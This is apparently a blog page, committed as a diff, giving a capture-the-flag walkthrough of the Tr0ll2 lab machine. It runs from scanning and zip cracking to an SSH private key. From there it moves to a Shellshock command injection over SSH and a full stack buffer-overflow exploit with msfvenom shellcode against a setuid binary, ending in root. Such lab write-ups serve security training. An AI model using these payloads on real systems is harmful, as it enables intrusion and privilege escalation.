@@ -1,0 +1,389 @@
+I"%p<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan discovered the target host on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.183 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Full TCP port scan with nmap detected three open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.183 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
+...
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Service detection and script scanning was did with nmap to get more information about the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,80 192.168.179.183 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d <span class="o">(</span>RSA<span class="o">)</span>
+|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 <span class="o">(</span>ECDSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+...
+</span></code></pre></div></div>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+
+<p><img src="/assets/images/tr0ll2/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-3.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>unzip lmao.zip 
+Archive:  lmao.zip
+<span class="o">[</span>lmao.zip] noob password: 
+password incorrect--reenter: 
+password incorrect--reenter: 
+   skipping: noob                    incorrect password
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>The home page contains only an image.</p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-4.png" alt="" /></p>
+
+<p>By listing the robots.txt file were discovered a list of possible web directories.</p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-5.png" alt="" /></p>
+
+<p>We copy the directories name to a file on the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.183/robots.txt | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 2 | <span class="nb">tail</span> <span class="nt">-n</span> +3 <span class="o">&gt;</span> dirs.txt
+</code></pre></div></div>
+
+<p>Then, we try to brute force with dirsearch to discover the existing directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.179.183/ <span class="nt">-w</span> /root/tr0ll2/dirs.txt
+...
+<span class="o">[</span>21:49:06] 301 -  317B  - /noob  -&gt;  http://192.168.179.183/noob/
+<span class="o">[</span>21:49:06] 301 -  324B  - /keep_trying  -&gt;  http://192.168.179.183/keep_trying/
+<span class="o">[</span>21:49:06] 301 -  324B  - /dont_bother  -&gt;  http://192.168.179.183/dont_bother/
+<span class="o">[</span>21:49:06] 301 -  326B  - /ok_this_is_it  -&gt;  http://192.168.179.183/ok_this_is_it/
+...
+</code></pre></div></div>
+
+<p>In the output we can see that the tool found four directories, but these contains the same image as shown below.</p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-6.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-7.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-8.png" alt="" /></p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-9.png" alt="" /></p>
+
+<p>We need download the images possibly these contains some valuable information, we save the existing directories on the target into a file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"noob</span><span class="se">\n</span><span class="s2">keep_trying</span><span class="se">\n</span><span class="s2">dont_bother</span><span class="se">\n</span><span class="s2">ok_this_is_it"</span> <span class="o">&gt;</span> img-dirs.txt
+</code></pre></div></div>
+
+<p>I have writen a bash script to download automaticly the images.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">host</span><span class="o">=</span><span class="s2">"http://192.168.179.183"</span>
+
+<span class="k">function </span>download<span class="o">(){</span>
+	<span class="nv">c</span><span class="o">=</span>1
+	<span class="k">while </span><span class="nb">read dirs</span><span class="p">;</span> <span class="k">do
+		</span><span class="nv">img</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nv">$host</span>/<span class="nv">$dirs</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"'.*'"</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"'"</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
+		<span class="nb">echo</span> <span class="s2">"Downloading image</span><span class="nv">$c</span><span class="s2">.jpg"</span>
+		<span class="nb">sleep </span>1
+		wget <span class="nt">-q</span> <span class="s2">"</span><span class="nv">$host</span><span class="s2">/</span><span class="nv">$dirs</span><span class="s2">/</span><span class="nv">$img</span><span class="s2">"</span> <span class="nt">-O</span> images/image<span class="nv">$c</span>.jpg
+		<span class="nv">c</span><span class="o">=</span><span class="k">$((</span>c+1<span class="k">))</span>	
+	<span class="k">done</span> &lt; img-dirs.txt
+	<span class="nb">echo</span> <span class="s2">"Done."</span>
+<span class="o">}</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nt">-d</span> images <span class="o">]]</span><span class="p">;</span> <span class="k">then
+	</span>download
+<span class="k">else
+	</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Creating directory.."</span>
+	<span class="nb">sleep </span>1
+	<span class="nb">mkdir </span>images
+	download
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<p>We run the script and the images will be download into a directory called images.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>bash download-img.sh
+Creating directory..
+Downloading image1.jpg
+Downloading image2.jpg
+Downloading image3.jpg
+Downloading image4.jpg
+Done.
+</code></pre></div></div>
+
+<p>Analizing the images with the strings tool, the image number three contains a message at the final of the content.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span><span class="nb">ls </span>images | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"Analyzing </span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> strings images/<span class="nv">$line</span> | less<span class="p">;</span> <span class="k">done
+
+</span>root@kali:~/tr0ll2<span class="nv">$ </span>strings images/image3.jpg | <span class="nb">tail</span> <span class="nt">-1</span>
+Look Deep within y0ur_self <span class="k">for </span>the answer
+</code></pre></div></div>
+
+<p>We use the browser to search the content into the <strong>y0ur_self</strong> directory.</p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-10.png" alt="" /></p>
+
+<p>The answer.txt file contains a large list of words in base64.</p>
+
+<p><img src="/assets/images/tr0ll2/screenshot-11.png" alt="" /></p>
+
+<p>We decode the base64 words and  we save it into a file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.183/y0ur_self/answer.txt"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> b64decode.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> b64decode.txt lmao.zip  
+
+
+PASSWORD FOUND!!!!: pw <span class="o">==</span> ItCantReallyBeThisEasyRightLOL
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>unzip lmao.zip
+Archive:  lmao.zip
+<span class="o">[</span>lmao.zip] noob password: 
+  inflating: noob
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span><span class="nb">cat </span>noob 
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
+yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
+/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
+q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
+z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
+e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
+u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
+gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
+UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
+La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
+xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
+aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
+K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
+n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
+TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
+WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
+ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
+0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
+vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
+ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
+th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
+G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
+q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
+vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
+<span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183
+TRY HARDER LOL!
+Connection to 192.168.179.183 closed.
+</code></pre></div></div>
+
+<p>Trying with a shellshock</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183 <span class="s1">'() { :;}; echo hello;id'</span>
+hello
+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183 <span class="s1">'() { :;}; echo hello;bash -i'</span>
+hello
+bash: no job control <span class="k">in </span>this shell
+noob@Tr0ll2:~<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+...
+<span class="nt">-rwsr-xr-x</span> 1 root root 7271 Oct  4  2014 /nothing_to_see_here/choose_wisely/door2/r00t
+<span class="nt">-rwsr-xr-x</span> 1 root root 7273 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t
+<span class="nt">-rwsr-xr-x</span> 1 root root 8401 Oct  5  2014 /nothing_to_see_here/choose_wisely/door1/r00t
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /nothing_to_see_here/choose_wisely/<span class="k">*</span>         
+<span class="nb">ls</span> <span class="nt">-la</span> /nothing_to_see_here/choose_wisely/<span class="k">*</span>
+/nothing_to_see_here/choose_wisely/door1:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  4  2014 <span class="nb">.</span>
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+<span class="nt">-rwsr-xr-x</span> 1 root root 7271 Oct  4  2014 r00t
+
+/nothing_to_see_here/choose_wisely/door2:
+total 20
+drwsr-xr-x 2 root root 4096 Oct  5  2014 <span class="nb">.</span>
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+<span class="nt">-rwsr-xr-x</span> 1 root root 8401 Oct  5  2014 r00t
+
+/nothing_to_see_here/choose_wisely/door3:
+total 16
+drwsr-xr-x 2 root root 4096 Oct  5  2014 <span class="nb">.</span>
+drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
+<span class="nt">-rwsr-xr-x</span> 1 root root 7273 Oct  5  2014 r00t
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">cp</span> /nothing_to_see_here/choose_wisely/door2/r00t <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>we verify if gdb exists</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>which gdb
+which gdb
+/usr/bin/gdb
+noob@Tr0ll2:~<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>file r00t
+file r00t
+r00t: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x438546c50f77d4bac3e0c41b4f8bcd60899c4006, not stripped
+noob@Tr0ll2:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="setuid-binary">SETUID Binary</h3>
+
+<p>ASLR disabled</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space 
+0
+noob@Tr0ll2:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Debugging r00t binary</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./r00t
+gdb <span class="nt">-q</span> ./r00t
+Reading symbols from /home/noob/r00t...done.
+<span class="o">(</span>gdb<span class="o">)</span> info functions
+All defined functions:
+
+File bof.c:
+int main<span class="o">(</span>int, char <span class="k">**</span><span class="o">)</span><span class="p">;</span>
+
+Non-debugging symbols:
+0x080482f4  _init
+0x08048340  <span class="nb">printf
+</span>0x08048340  <span class="nb">printf</span>@plt
+0x08048350  strcpy
+0x08048350  strcpy@plt
+0x08048360  __gmon_start__
+0x08048360  __gmon_start__@plt
+0x08048370  <span class="nb">exit
+</span>0x08048370  <span class="nb">exit</span>@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x080484b0  __libc_csu_init
+0x08048520  __libc_csu_fini
+0x08048522  __i686.get_pc_thunk.bx
+0x08048530  __do_global_ctors_aux
+0x0804855c  _fini
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>we generate a string of 300 characters</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 300
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+Starting program: /home/noob/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6a413969 <span class="k">in</span> ?? <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We identify the offset</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 300 <span class="nt">-q</span> 0x6a413969
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 268
+root@kali:~/tr0ll2<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We check if controll the eip register</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + 'B'*4 + 'C'*100)"</span><span class="si">)</span>
+Starting program: /home/noob/r00t <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + 'B'*4 + 'C'*100)"</span><span class="si">)</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
+</code></pre></div></div>
+
+<p>verifying the esp register</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/40wx <span class="nv">$esp</span>
+0xbffffb80:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffb90:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffba0:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffbb0:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffbc0:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffbd0:     0x43434343      0x43434343      0x43434343      0x43434343
+0xbffffbe0:     0x43434343      0x08048300      0x00000000      0x080483b1
+0xbffffbf0:     0x08048444      0x00000002      0xbffffc14      0x080484b0
+0xbffffc00:     0x08048520      0xb7fed280      0xbffffc0c      0xb7fff918
+0xbffffc10:     0x00000002      0xbffffd2c      0xbffffd3c      0x00000000
+</code></pre></div></div>
+
+<p>we generate the shellcode 70 bytes</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/exec <span class="nv">cmd</span><span class="o">=</span>/bin/sh <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> python <span class="nt">-o</span> shellcode.txt 
+</code></pre></div></div>
+
+<p>we copy our shellcode</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*"'</span> shellcode.txt | <span class="nb">sed</span> <span class="s1">'s/"//g'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> c
+</code></pre></div></div>
+
+<p>0xbffffb80  -&gt; $eip</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>find /nothing_to_see_here/ <span class="nt">-size</span> 8401c <span class="nt">-name</span> r00t
+/nothing_to_see_here/choose_wisely/door2/r00t
+
+noob@Tr0ll2:~<span class="nv">$ </span><span class="si">$(</span><span class="o">!!</span><span class="si">)</span> <span class="si">$(</span>python <span class="nt">-c</span> <span class="s2">"print('A'*268 + '</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">bf' + '</span><span class="se">\x</span><span class="s2">90'*10 + '</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">9d</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">fa</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">98</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">b5</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">9c</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">36')"</span><span class="si">)</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
+bash <span class="nt">-i</span>
+bash: no job control <span class="k">in </span>this shell
+root@Tr0ll2:/home/noob#
+</code></pre></div></div>
+
+<p>we read the flag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Tr0ll2:/root# <span class="nb">cat </span>Proof.txt
+<span class="nb">cat </span>Proof.txt
+You win this <span class="nb">time </span>young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4
+</code></pre></div></div>
+:ET
